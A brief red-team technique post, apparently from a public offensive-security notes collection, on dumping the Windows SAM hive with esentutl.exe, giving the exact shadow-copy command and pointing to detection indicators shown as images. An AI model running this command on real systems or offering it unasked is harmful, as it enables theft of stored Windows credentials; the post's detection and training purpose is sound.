---
layout: post
title: "dumping sam via esentutl.exe"
date: 2024-06-18
categories: all_md_files
tags: redteam, mitre killchain, offensivesecurity, cpent, cpts, oscp, exploit
permalink: /dumping-sam-via-esentutl.exe/
---

---
layout: post
title: "dumping sam via esentutl.exe"
date: 2024-06-18
categories: credential-access-and-credential-dumping
tags: redteam, mitre killchain, offensivesecurity, cpent, cpts, oscp, exploit
permalink: /dumping-sam-via-esentutl.exe/
---

# Dumping SAM via esentutl.exe

## Execution

It's possible to use esentutl.exe that comes with Windows and dump SAM/Security hives like so:

```
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\temp\sam
```

![](<../../.gitbook/assets/image (632).png>)

## Observation

The below are some potential IOCs for detecting this technique:

![](<../../.gitbook/assets/image (633).png>)

## References

{% embed url="https://superuser.com/questions/364290/how-to-dump-the-windows-sam-file-while-the-system-is-running" %}
@spotheplanet
